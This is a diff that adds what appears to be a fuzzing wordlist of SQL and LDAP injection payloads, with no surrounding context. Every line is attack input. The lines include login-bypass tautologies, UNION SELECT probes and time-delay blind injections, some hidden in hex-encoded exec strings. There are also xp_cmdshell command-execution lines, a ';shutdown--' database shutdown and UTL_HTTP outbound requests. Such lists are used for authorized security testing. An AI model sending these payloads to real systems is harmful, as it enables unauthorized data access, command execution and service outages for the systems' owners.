@@ -1,0 +1,183 @@
+ or 0=0 #"
+ or 1=1 or ""=
+ or a = a
+ or a=a
+!
+"
+" or "a"="a
+" or "x"="x
+" or 0=0 #
+" or 0=0 --
+" or 1=1 or ""="
+" or 1=1--
+"' or 1 --'"
+") or ("a"="a
+"a"" or 1=1--"
+"a"" or 3=3--"
+"hi"") or (""a""=""a"
+#
+%20$(sleep%2050)
+%20'sleep%2050'
+%20or%20x=x
+%21
+%26
+%27%20or%201=1
+%28
+%29
+%2A%28%7C%28mail%3D%2A%29%29
+%2A%28%7C%28objectclass%3D%2A%29%29
+%2A%7C
+%7C
+&
+&apos;%20OR
+&lt;&gt;&quot;'%;)(&amp;+
+'
+' (select top 1
+' --
+' ;
+' AnD '' like '
+' UNION ALL SELECT
+' UNION SELECT
+' aND '' like '%
+' and '' like '
+' and '' like '%
+' and '' like ''--
+' and 2>1--
+' and 2>3--
+' or '' like '
+' or ''='
+' or '1'='1'--
+' or 'x'='x
+' or (EXISTS)
+' or 0=0 #
+' or 0=0 --
+' or 1 --'
+' or 1=1
+' or 1=1 or ''='
+' or 1=1--
+' or 3=3
+' or a=a--
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+'%20or%20''='
+'%20or%20'x'='x
+'%20or%201=1
+') and ('x'='x
+') or ('a'='a
+') or ('x'='x
+')%20or%20('x'='x
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; exec xp_regread
+';shutdown--
+'hi' or 'x'='x';
+'or select *
+'or''='
+'or'='or'
+'sqlattempt1
+'||UTL_HTTP.REQUEST
+(
+(sqlattempt2)
+)
+) and (1=1
+) or (a=a
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
+,@variable
+-
+--
+--';
+--sp_password
+/
+//
+//*
+0 or 1=1
+1 and 1=1
+1 exec sp_ (or exec xp_)
+1 or 1=1
+1 waitfor delay '0:0:10'--
+1' and 1=(select count(*) from tablenames); --
+1' or '1'='1
+1'1
+1'or'1'='1
+1;SELECT%20*
+1or1=1
+23 OR 1=1
+<>"'%;)(&+
+= '
+= --
+= ;
+?
+@variable
+PRINT
+PRINT @@variable
+\x23
+\x27
+\x27UNION SELECT
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+\x3D \x27
+\x3D \x3B'
+a'
+a' or 'a' = 'a
+a' or 1=1--
+a' or 3=3--
+a' waitfor delay '0:0:10'--
+admin'--
+anything' OR 'x'='x
+as
+asc
+bfilename
+char%4039%41%2b%40SELECT
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+delete
+desc
+distinct
+exec sp
+exec xp
+fake@ema'or'il.nl'='il.nl
+handler
+having
+hi or 1=1 --"
+hi or a=a
+hi" or "a"="a
+hi" or 1=1 --
+hi") or ("a"="a
+hi' or 'a'='a
+hi' or 1=1 --
+hi') or ('a'='a
+insert
+like
+limit
+or
+or 0=0 #
+or 0=0 --
+or 1=1--
+or%201=1
+or%201=1 --
+order by
+procedure
+replace
+select
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+to_timestamp_tz
+truncate
+tz_offset
+update
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' OR full_name LIKE '%Bob%
+x' or 1=1 or 'x'='y
+|
+‘ or 1=1 --
+‘ or 3=3 --
